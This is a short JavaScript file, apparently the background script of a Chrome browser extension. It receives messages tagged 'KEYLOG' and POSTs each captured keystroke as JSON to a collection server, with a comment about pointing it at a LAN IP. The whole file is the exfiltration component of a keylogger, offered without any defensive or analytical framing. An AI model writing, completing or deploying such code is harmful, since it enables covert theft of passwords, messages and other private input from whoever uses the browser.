const SERVER_URL = 'http://localhost:3000/log'; // Replace with your LAN IP

chrome.runtime.onMessage.addListener((req, sender, sendResponse) => {
  if (req.type === 'KEYLOG') {
    fetch(SERVER_URL, {
      method: 'POST',
      body: JSON.stringify({ key: req.key }),
      headers: { 'Content-Type': 'application/json' }
    }).catch(err => console.error('Failed to send key:', err));
  }
});